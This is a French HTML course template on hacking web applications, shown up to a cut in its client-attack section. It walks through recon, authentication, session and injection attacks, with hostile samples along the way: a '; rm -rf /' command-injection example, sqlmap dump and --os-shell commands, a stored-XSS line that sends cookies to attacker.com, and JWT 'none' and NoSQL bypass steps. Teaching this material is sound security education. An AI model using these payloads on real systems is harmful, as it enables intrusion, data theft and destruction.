@@ -1,0 +1,1239 @@
+{% extends "base.html" %}
+
+{% block title %}Cours - Hacking Web Applications{% endblock %}
+
+{% block content %}
+
+
+<div class="container mt-4">
+    <h1>Module 14: Hacking Web Applications</h1>
+    
+    <!-- Table des matières -->
+    <table class="table table-bordered table-of-contents">
+        <thead>
+            <tr>
+                <th>Section</th>
+                <th>Description</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><a href="#web-concepts">1. Concepts des applications web</a></td>
+                <td>Fondamentaux des apps web modernes</td>
+            </tr>
+            <tr>
+                <td><a href="#web-threats">2. Menaces des applications web</a></td>
+                <td>Vulnérabilités et risques</td>
+            </tr>
+            <tr>
+                <td><a href="#hacking-method">3. Méthodologie de hacking</a></td>
+                <td>Processus systématique d'attaque</td>
+            </tr>
+            <tr>
+                <td><a href="#footprint">4. Empreinte de l'infrastructure</a></td>
+                <td>Collecte d'informations</td>
+            </tr>
+            <tr>
+                <td><a href="#analyze-app">5. Analyse des applications</a></td>
+                <td>Compréhension de la cible</td>
+            </tr>
+            <tr>
+                <td><a href="#bypass-client">6. Contournement des contrôles client</a></td>
+                <td>Déjouer les validations côté client</td>
+            </tr>
+            <tr>
+                <td><a href="#attack-auth">7. Attaque des mécanismes d'authentification</a></td>
+                <td>Compromission des systèmes de login</td>
+            </tr>
+            <tr>
+                <td><a href="#attack-authz">8. Attaque des schémas d'autorisation</a></td>
+                <td>Contournement des contrôles d'accès</td>
+            </tr>
+            <tr>
+                <td><a href="#attack-session">9. Attaque de la gestion de session</a></td>
+                <td>Détournement de sessions</td>
+            </tr>
+            <tr>
+                <td><a href="#injection">10. Attaques par injection</a></td>
+                <td>Exploitation des failles de validation</td>
+            </tr>
+            <tr>
+                <td><a href="#logic-flaws">11. Failles logiques applicatives</a></td>
+                <td>Exploitation des erreurs métier</td>
+            </tr>
+            <tr>
+                <td><a href="#shared-env">12. Environnements partagés</a></td>
+                <td>Attaques sur les architectures mutualisées</td>
+            </tr>
+            <tr>
+                <td><a href="#db-attack">13. Attaque de la connectivité DB</a></td>
+                <td>Compromission des bases de données</td>
+            </tr>
+            <tr>
+                <td><a href="#client-attack">14. Attaque du client web</a></td>
+                <td>Vulnérabilités côté navigateur</td>
+            </tr>
+            <tr>
+                <td><a href="#web-services">15. Attaque des services web</a></td>
+                <td>API, SOAP, REST</td>
+            </tr>
+            <tr>
+                <td><a href="#api-webhooks">16. Web API, Webhooks et Web Shell</a></td>
+                <td>Technologies modernes</td>
+            </tr>
+            <tr>
+                <td><a href="#web-security">17. Sécurité des applications web</a></td>
+                <td>Bonnes pratiques et défenses</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- Sections de contenu -->
+    
+    <section id="web-concepts">
+        <h1>1. Concepts des applications web</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Architecture moderne</h3>
+                <div class="card bg-light p-3 mb-3">
+                    <ol>
+                        <li><strong>Client</strong>: Navigateur, applications mobiles</li>
+                        <li><strong>Serveur Web</strong>: Nginx, Apache, IIS</li>
+                        <li><strong>Backend</strong>: Node.js, Django, Spring Boot</li>
+                        <li><strong>Base de données</strong>: SQL, NoSQL, In-Memory</li>
+                        <li><strong>Services externes</strong>: API, microservices</li>
+                    </ol>
+                </div>
+                
+                <h3>Technologies clés</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Couche</th>
+                        <th>Technologies</th>
+                    </tr>
+                    <tr>
+                        <td>Frontend</td>
+                        <td>React, Angular, Vue.js, HTML5, CSS3</td>
+                    </tr>
+                    <tr>
+                        <td>Backend</td>
+                        <td>PHP, Python, Java, Ruby, .NET</td>
+                    </tr>
+                    <tr>
+                        <td>Protocoles</td>
+                        <td>HTTP/HTTPS, WebSocket, REST, GraphQL</td>
+                    </tr>
+                    <tr>
+                        <td>Stockage</td>
+                        <td>Cookies, Session Storage, Local Storage</td>
+                    </tr>
+                </table>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-danger text-white">
+                    <div class="card-body">
+                        <h4>Statistiques de sécurité</h4>
+                        <ul>
+                            <li>85% des violations exploitent des vulnérabilités web</li>
+                            <li>43% des apps web ont des vulnérabilités critiques</li>
+                            <li>Top 3 des vulnérabilités: Injection, XSS, Broken Auth</li>
+                            <li>Coût moyen d'une violation: $4.35 millions</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-primary text-white">
+                        <h4>Cycle de vie d'une requête</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Requête HTTP du client</li>
+                            <li>Routage par le serveur web</li>
+                            <li>Traitement par l'application</li>
+                            <li>Interaction avec la base de données</li>
+                            <li>Génération de la réponse</li>
+                            <li>Envoi au client</li>
+                            <li>Rendu dans le navigateur</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card bg-info text-white mt-3">
+                    <div class="card-body">
+                        <h4>Concepts de sécurité</h4>
+                        <ul>
+                            <li>Same-Origin Policy (SOP)</li>
+                            <li>Cross-Origin Resource Sharing (CORS)</li>
+                            <li>Content Security Policy (CSP)</li>
+                            <li>HTTP Strict Transport Security (HSTS)</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="web-threats" class="mt-5">
+        <h1>2. Menaces des applications web</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Top 10 OWASP 2023</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Rang</th>
+                        <th>Vulnérabilité</th>
+                        <th>Fréquence</th>
+                    </tr>
+                    <tr>
+                        <td>1</td>
+                        <td>Injection</td>
+                        <td>94%</td>
+                    </tr>
+                    <tr>
+                        <td>2</td>
+                        <td>Broken Authentication</td>
+                        <td>88%</td>
+                    </tr>
+                    <tr>
+                        <td>3</td>
+                        <td>Sensitive Data Exposure</td>
+                        <td>85%</td>
+                    </tr>
+                    <tr>
+                        <td>4</td>
+                        <td>XML External Entities (XXE)</td>
+                        <td>82%</td>
+                    </tr>
+                    <tr>
+                        <td>5</td>
+                        <td>Broken Access Control</td>
+                        <td>79%</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-warning text-dark mt-3">
+                    <div class="card-header">
+                        <h4>Impact des menaces</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Vol de données sensibles</li>
+                            <li>Prise de contrôle de comptes</li>
+                            <li>Défacement de sites</li>
+                            <li>Installation de malware</li>
+                            <li>Attaques sur les clients</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-light p-3">
+                    <h4>Types d'attaquants</h4>
+                    <ul>
+                        <li><strong>Script Kiddies</strong>: Débutants utilisant des outils existants</li>
+                        <li><strong>Hacktivistes</strong>: Motivés par des causes politiques</li>
+                        <li><strong>Cybercriminels</strong>: Recherche de profit financier</li>
+                        <li><strong>Insiders</strong>: Employés malveillants</li>
+                        <li><strong>APT</strong>: Groupes sponsorisés par des États</li>
+                    </ul>
+                </div>
+                
+                <div class="card bg-danger text-white mt-3">
+                    <div class="card-body">
+                        <h4>Vecteurs d'attaque courants</h4>
+                        <ul>
+                            <li>Formulaires web non sécurisés</li>
+                            <li>APIs exposées sans authentification</li>
+                            <li>Configurations par défaut</li>
+                            <li>Composants vulnérables (librairies)</li>
+                            <li>Erreurs de validation des entrées</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="hacking-method" class="mt-5">
+        <h1>3. Méthodologie de hacking</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Processus d'attaque</h3>
+                <div class="card bg-light p-3">
+                    <ol>
+                        <li><strong>Reconnaissance</strong>: Collecte d'informations</li>
+                        <li><strong>Scanning</strong>: Identification des vulnérabilités</li>
+                        <li><strong>Énumération</strong>: Découverte des ressources</li>
+                        <li><strong>Exploitation</strong>: Abus des vulnérabilités</li>
+                        <li><strong>Escalade de privilèges</strong>: Obtention d'accès</li>
+                        <li><strong>Maintien de l'accès</strong>: Backdoors, webshells</li>
+                        <li><strong>Effacement des traces</strong>: Suppression des logs</li>
+                    </ol>
+                </div>
+                
+                <h3 class="mt-4">Outils essentiels</h3>
+                <ul>
+                    <li><strong>Reconnaissance</strong>: Whois, nslookup, theHarvester</li>
+                    <li><strong>Scanning</strong>: Nmap, Nikto, OWASP ZAP</li>
+                    <li><strong>Exploitation</strong>: Burp Suite, sqlmap, Metasploit</li>
+                    <li><strong>Post-exploitation</strong>: Webshells, mimikatz</li>
+                </ul>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Cadres méthodologiques</h4>
+                        <ul>
+                            <li><strong>OWASP Testing Guide</strong>: Standard pour les tests d'applications web</li>
+                            <li><strong>PTES</strong>: Penetration Testing Execution Standard</li>
+                            <li><strong>NIST SP 800-115</strong>: Guide pour les tests de sécurité</li>
+                            <li><strong>OSSTMM</strong>: Méthodologie open source</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-success text-white">
+                        <h4>Éthique et légalité</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Autorisation écrite obligatoire</li>
+                            <li>Respect du scope défini</li>
+                            <li>Minimisation des impacts</li>
+                            <li>Documentation complète</li>
+                            <li>Rapport détaillé des vulnérabilités</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="footprint" class="mt-5">
+        <h1>4. Empreinte de l'infrastructure</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Techniques de reconnaissance</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Méthode</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td>WHOIS</td>
+                        <td>Informations sur le domaine</td>
+                    </tr>
+                    <tr>
+                        <td>DNS Enumeration</td>
+                        <td>Découverte des sous-domaines</td>
+                    </tr>
+                    <tr>
+                        <td>Search Engine Hacking</td>
+                        <td>Recherche de contenu exposé</td>
+                    </tr>
+                    <tr>
+                        <td>Wayback Machine</td>
+                        <td>Archives historiques du site</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-light p-3 mt-3">
+                    <h5>Exemple: Dorking Google</h5>
+                    <code>site:example.com filetype:pdf</code><br>
+                    <code>site:example.com intitle:"index of"</code><br>
+                    <code>site:example.com "password"</code>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-danger text-white">
+                    <div class="card-body">
+                        <h4>Outils d'empreinte</h4>
+                        <ul>
+                            <li><strong>theHarvester</strong>: Collecte d'emails, sous-domaines</li>
+                            <li><strong>Sublist3r</strong>: Découverte de sous-domaines</li>
+                            <li><strong>Shodan</strong>: Moteur de recherche pour appareils</li>
+                            <li><strong>BuiltWith</strong>: Identification des technologies</li>
+                            <li><strong>Wappalyzer</strong>: Extension de navigateur</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-warning text-dark">
+                        <h4>Sources d'information</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Certificats SSL</li>
+                            <li>Headers HTTP</li>
+                            <li>Fichiers robots.txt</li>
+                            <li>Commentaires dans le code source</li>
+                            <li>Métadonnées des fichiers</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="analyze-app" class="mt-5">
+        <h1>5. Analyse des applications</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Étapes d'analyse</h3>
+                <div class="card bg-light p-3">
+                    <ol>
+                        <li>Cartographie de l'application</li>
+                        <li>Analyse des fonctionnalités</li>
+                        <li>Identification des points d'entrée</li>
+                        <li>Analyse des mécanismes de sécurité</li>
+                        <li>Reverse engineering des composants</li>
+                    </ol>
+                </div>
+                
+                <h3 class="mt-4">Techniques d'analyse</h3>
+                <ul>
+                    <li>Spidering/crawling de l'application</li>
+                    <li>Analyse du code source côté client</li>
+                    <li>Inspection des requêtes/réponses HTTP</li>
+                    <li>Décompilation des binaires</li>
+                    <li>Analyse des appels AJAX/API</li>
+                </ul>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Outils d'analyse</h4>
+                        <ul>
+                            <li><strong>Burp Suite</strong>: Proxy d'interception</li>
+                            <li><strong>OWASP ZAP</strong>: Scanner de vulnérabilités</li>
+                            <li><strong>Postman</strong>: Test d'APIs</li>
+                            <li><strong>Wireshark</strong>: Analyse du trafic réseau</li>
+                            <li><strong>Browser DevTools</strong>: Analyse intégrée au navigateur</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-primary text-white">
+                        <h4>Points d'entrée critiques</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Formulaires de login</li>
+                            <li>Champs de recherche</li>
+                            <li>Upload de fichiers</li>
+                            <li>Paramètres d'URL</li>
+                            <li>Cookies d'authentification</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="bypass-client" class="mt-5">
+        <h1>6. Contournement des contrôles client</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Types de contrôles client</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Contrôle</th>
+                        <th>Méthode de contournement</th>
+                    </tr>
+                    <tr>
+                        <td>Validation JavaScript</td>
+                        <td>Désactivation JS, modification du code</td>
+                    </tr>
+                    <tr>
+                        <td>Champs cachés</td>
+                        <td>Modification des valeurs</td>
+                    </tr>
+                    <tr>
+                        <td>CAPTCHA</td>
+                        <td>OCR, résolution par API, contournement logique</td>
+                    </tr>
+                    <tr>
+                        <td>Contrôles d'intégrité</td>
+                        <td>Modification des hashs/checksums</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-warning text-dark mt-3">
+                    <div class="card-header">
+                        <h4>Exemple: Contournement de validation</h4>
+                    </div>
+                    <div class="card-body">
+                        <p>Validation côté client: <code>if (price > 0) {...}</code></p>
+                        <p>Contournement: Modifier la requête HTTP pour envoyer <code>price=-10</code></p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-light p-3">
+                    <h4>Outils de contournement</h4>
+                    <ul>
+                        <li><strong>Burp Suite</strong>: Interception et modification des requêtes</li>
+                        <li><strong>Browser DevTools</strong>: Modification en temps réel</li>
+                        <li><strong>curl</strong>: Envoi de requêtes personnalisées</li>
+                        <li><strong>Postman</strong>: Test d'APIs avec paramètres modifiés</li>
+                    </ul>
+                </div>
+                
+                <div class="card bg-danger text-white mt-3">
+                    <div class="card-body">
+                        <h4>Démonstration: Contournement CAPTCHA</h4>
+                        <ol>
+                            <li>Identifier le CAPTCHA comme élément client</li>
+                            <li>Envoyer une valeur statique au lieu du CAPTCHA</li>
+                            <li>Réutiliser un token CAPTCHA valide</li>
+                            <li>Utiliser un service de résolution automatique</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="attack-auth" class="mt-5">
+        <h1>7. Attaque des mécanismes d'authentification</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Vecteurs d'attaque</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Attaque</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td>Brute Force</td>
+                        <td>Essais de mots de passe en masse</td>
+                    </tr>
+                    <tr>
+                        <td>Credential Stuffing</td>
+                        <td>Réutilisation de credentials volés</td>
+                    </tr>
+                    <tr>
+                        <td>Password Spraying</td>
+                        <td>Essai de mots de passe courants sur plusieurs comptes</td>
+                    </tr>
+                    <tr>
+                        <td>Session Hijacking</td>
+                        <td>Vol de tokens de session</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-light p-3 mt-3">
+                    <h5>Faiblesses courantes</h5>
+                    <ul>
+                        <li>Mots de passe faibles ou par défaut</li>
+                        <li>Absence de verrouillage de compte</li>
+                        <li>Réinitialisation de mot de passe non sécurisée</li>
+                        <li>Stockage non sécurisé des credentials</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Outils d'attaque</h4>
+                        <ul>
+                            <li><strong>Hydra</strong>: Brute force réseau</li>
+                            <li><strong>Burp Intruder</strong>: Attaques personnalisées</li>
+                            <li><strong>John the Ripper</strong>: Crackage de mots de passe</li>
+                            <li><strong>Hashcat</strong>: Crackage accéléré par GPU</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-warning text-dark">
+                        <h4>Attaque par credential stuffing</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Obtenir des listes de credentials (fuites de données)</li>
+                            <li>Nettoyer et formater les données</li>
+                            <li>Utiliser un outil comme Sentry MBA ou SNIPR</li>
+                            <li>Tester les combinaisons sur la cible</li>
+                            <li>Exploiter les comptes compromis</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="attack-authz" class="mt-5">
+        <h1>8. Attaque des schémas d'autorisation</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Problèmes courants</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li>IDOR (Insecure Direct Object Reference)</li>
+                        <li>Contournement des contrôles d'accès</li>
+                        <li>Élévation de privilèges</li>
+                        <li>Défauts dans les contrôles RBAC/ABAC</li>
+                        <li>JWT mal configurés</li>
+                    </ul>
+                </div>
+                
+                <h3 class="mt-4">IDOR Examples</h3>
+                <div class="card bg-warning text-dark">
+                    <div class="card-body">
+                        <p>URL vulnérable: <code>https://example.com/profile?user_id=123</code></p>
+                        <p>Attaque: Changer <code>user_id=124</code> pour accéder à un autre profil</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-danger text-white">
+                    <div class="card-body">
+                        <h4>Techniques d'attaque</h4>
+                        <ul>
+                            <li>Manipulation des paramètres</li>
+                            <li>Modification des méthodes HTTP</li>
+                            <li>Ajout de headers personnalisés</li>
+                            <li>Exploitation des tokens JWT</li>
+                            <li>Abus des fonctionnalités d'API</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-success text-white">
+                        <h4>Attaque JWT</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Récupérer un token JWT</li>
+                            <li>Décoder le token sur jwt.io</li>
+                            <li>Modifier les claims (ex: role:admin)</li>
+                            <li>Signer avec l'algorithme "none"</li>
+                            <li>Renvoyer le token modifié</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="attack-session" class="mt-5">
+        <h1>9. Attaque de la gestion de session</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Vulnérabilités courantes</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Vulnérabilité</th>
+                        <th>Impact</th>
+                    </tr>
+                    <tr>
+                        <td>Session Fixation</td>
+                        <td>Prise de contrôle de session</td>
+                    </tr>
+                    <tr>
+                        <td>Session Timeout Absent</td>
+                        <td>Session perpétuelle</td>
+                    </tr>
+                    <tr>
+                        <td>Cookies non sécurisés</td>
+                        <td>Vol via MITM ou XSS</td>
+                    </tr>
+                    <tr>
+                        <td>Prédiction d'ID de session</td>
+                        <td>Génération de sessions valides</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-light p-3 mt-3">
+                    <h5>Attaque par fixation de session</h5>
+                    <ol>
+                        <li>Attaquant crée une session valide</li>
+                        <li>Force la victime à utiliser cette session</li>
+                        <li>Victime s'authentifie avec cette session</li>
+                        <li>Attaquant accède au compte authentifié</li>
+                    </ol>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Outils d'attaque</h4>
+                        <ul>
+                            <li><strong>Burp Suite</strong>: Manipulation de cookies</li>
+                            <li><strong>OWASP ZAP</strong>: Analyse de session</li>
+                            <li><strong>Cookie-Editor</strong>: Extension navigateur</li>
+                            <li><strong>Web Developer Tools</strong>: Visualisation des cookies</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-primary text-white">
+                        <h4>Bonnes pratiques de session</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Utilisation de tokens aléatoires longs</li>
+                            <li>Renouvellement après authentification</li>
+                            <li>Cookies Secure, HttpOnly, SameSite</li>
+                            <li>Timeout automatique</li>
+                            <li>Invalidation côté serveur</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="injection" class="mt-5">
+        <h1>10. Attaques par injection</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Types d'injection</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Type</th>
+                        <th>Exemple</th>
+                    </tr>
+                    <tr>
+                        <td>SQL Injection</td>
+                        <td>' OR 1=1--</td>
+                    </tr>
+                    <tr>
+                        <td>Command Injection</td>
+                        <td>; rm -rf /</td>
+                    </tr>
+                    <tr>
+                        <td>LDAP Injection</td>
+                        <td>*)(objectClass=*))</td>
+                    </tr>
+                    <tr>
+                        <td>XPath Injection</td>
+                        <td>' or 1=1 or 'a'='a</td>
+                    </tr>
+                    <tr>
+                        <td>Template Injection</td>
+                        <td>{{7*7}} = 49</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-warning text-dark mt-3">
+                    <div class="card-header">
+                        <h4>Impact des injections</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Accès non autorisé aux données</li>
+                            <li>Exécution de commandes système</li>
+                            <li>Compromission du serveur</li>
+                            <li>Déni de service</li>
+                            <li>Prise de contrôle complète</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-danger text-white">
+                    <div class="card-body">
+                        <h4>Outils d'injection</h4>
+                        <ul>
+                            <li><strong>sqlmap</strong>: Détection et exploitation SQLi</li>
+                            <li><strong>Commix</strong>: Exploitation de command injection</li>
+                            <li><strong>NoSQLMap</strong>: Injection NoSQL</li>
+                            <li><strong>XSStrike</strong>: Détection avancée XSS</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-success text-white">
+                        <h4>Démonstration SQLi avec sqlmap</h4>
+                    </div>
+                    <div class="card-body">
+                        <pre class="bg-dark text-light p-2 rounded">
+sqlmap -u "http://example.com?id=1" --dbs
+sqlmap -u "http://example.com?id=1" -D dbname --tables
+sqlmap -u "http://example.com?id=1" -D dbname -T users --dump
+sqlmap -u "http://example.com?id=1" --os-shell</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="logic-flaws" class="mt-5">
+        <h1>11. Failles logiques applicatives</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Exemples de failles logiques</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li>Contournement des étapes de processus</li>
+                        <li>Logique métier défectueuse</li>
+                        <li>Problèmes de séquence temporelle</li>
+                        <li>Incohérences dans les flux de travail</li>
+                        <li>Erreurs dans les calculs financiers</li>
+                    </ul>
+                </div>
+                
+                <div class="card bg-warning text-dark mt-3">
+                    <div class="card-header">
+                        <h4>Exemple: Contournement de paiement</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Ajouter des articles au panier</li>
+                            <li>Passer à l'étape de paiement</li>
+                            <li>Modifier le prix total dans la requête</li>
+                            <li>Confirmer la commande avec le prix modifié</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Détection des failles logiques</h4>
+                        <ul>
+                            <li>Analyse approfondie des flux métier</li>
+                            <li>Test des cas limites</li>
+                            <li>Modification des paramètres cachés</li>
+                            <li>Changement de l'ordre des étapes</li>
+                            <li>Test des incohérences métier</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-primary text-white">
+                        <h4>Outils d'analyse</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Burp Suite (Repeater, Sequencer)</li>
+                            <li>OWASP ZAP</li>
+                            <li>Postman pour les scénarios complexes</li>
+                            <li>Outils de scripting personnalisés</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="shared-env" class="mt-5">
+        <h1>12. Environnements partagés</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Risques des environnements partagés</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Environnement</th>
+                        <th>Vulnérabilités</th>
+                    </tr>
+                    <tr>
+                        <td>Hébergement mutualisé</td>
+                        <td>Cross-site contamination</td>
+                    </tr>
+                    <tr>
+                        <td>Conteneurs Docker</td>
+                        <td>Évasion de conteneur</td>
+                    </tr>
+                    <tr>
+                        <td>VM partagées</td>
+                        <td>Hypervisor escape</td>
+                    </tr>
+                    <tr>
+                        <td>Serverless</td>
+                        <td>Injection de fonctions</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-light p-3 mt-3">
+                    <h5>Attaque: Cross-site contamination</h5>
+                    <ol>
+                        <li>Identifier un site vulnérable sur le même serveur</li>
+                        <li>Exploiter une vulnérabilité LFI/RFI</li>
+                        <li>Accéder aux fichiers d'autres sites</li>
+                        <li>Compromettre le serveur via un site faible</li>
+                    </ol>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-danger text-white">
+                    <div class="card-body">
+                        <h4>Contre-mesures</h4>
+                        <ul>
+                            <li>Isolation stricte des environnements</li>
+                            <li>Renforcement des configurations</li>
+                            <li>Mise à jour régulière des composants</li>
+                            <li>Surveillance des accès inter-applications</li>
+                            <li>Utilisation de sandboxing</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-warning text-dark">
+                        <h4>Évasion de conteneur Docker</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Obtenir un accès dans un conteneur</li>
+                            <li>Identifier les montages sensibles</li>
+                            <li>Exploiter les capabilities excessives</li>
+                            <li>Accéder au socket Docker</li>
+                            <li>Exécuter des commandes sur l'hôte</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="db-attack" class="mt-5">
+        <h1>13. Attaque de la connectivité DB</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Vecteurs d'attaque</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li>Injection SQL/NoSQL</li>
+                        <li>Accès direct non authentifié</li>
+                        <li>Credentials par défaut ou faibles</li>
+                        <li>Exploitation des procédures stockées</li>
+                        <li>Attaques sur les connexions chiffrées</li>
+                    </ul>
+                </div>
+                
+                <div class="card bg-warning text-dark mt-3">
+                    <div class="card-header">
+                        <h4>Exemple: Attaque NoSQL</h4>
+                    </div>
+                    <div class="card-body">
+                        <p>Requête MongoDB: <code>db.users.find({user: "admin", password: "password"})</code></p>
+                        <p>Attaque: <code>{ "user": "admin", "password": {"$ne": ""} }</code></p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Outils d'attaque DB</h4>
+                        <ul>
+                            <li><strong>sqlmap</strong>: Injection SQL avancée</li>
+                            <li><strong>NoSQLMap</strong>: Exploitation NoSQL</li>
+                            <li><strong>Adminer</strong>: Interface web pour gestion DB</li>
+                            <li><strong>Metasploit</strong>: Modules d'exploitation DB</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-success text-white">
+                        <h4>Post-exploitation DB</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Extraction de données sensibles</li>
+                            <li>Élévation de privilèges via DB</li>
+                            <li>Exécution de commandes système</li>
+                            <li>Pivotage vers d'autres systèmes</li>
+                            <li>Installation de backdoors persistantes</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="client-attack" class="mt-5">
+        <h1>14. Attaque du client web</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Vulnérabilités côté client</h3>
+                <table class="table table-bordered">
+                    <tr>
+                        <th>Vulnérabilité</th>
+                        <th>Impact</th>
+                    </tr>
+                    <tr>
+                        <td>Cross-Site Scripting (XSS)</td>
+                        <td>Vol de session, défacement</td>
+                    </tr>
+                    <tr>
+                        <td>Cross-Site Request Forgery (CSRF)</td>
+                        <td>Actions non autorisées</td>
+                    </tr>
+                    <tr>
+                        <td>Clickjacking</td>
+                        <td>Interaction utilisateur trompée</td>
+                    </tr>
+                    <tr>
+                        <td>DOM-based Vulnerabilities</td>
+                        <td>Exécution de code malveillant</td>
+                    </tr>
+                </table>
+                
+                <div class="card bg-light p-3 mt-3">
+                    <h5>Exemple: XSS Stored</h5>
+                    <code>&lt;script&gt;fetch('https://attacker.com?cookie='+document.cookie)&lt;/script&gt;</code>
+                    <p class="mt-2">Injecté dans un champ de commentaire, vole les cookies des visiteurs</p>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-danger text-white">
+                    <div class="card-body">
+                        <h4>Outils d'attaque client</h4>
+                        <ul>
+                            <li><strong>BeEF</strong>: Framework d'exploitation browser</li>
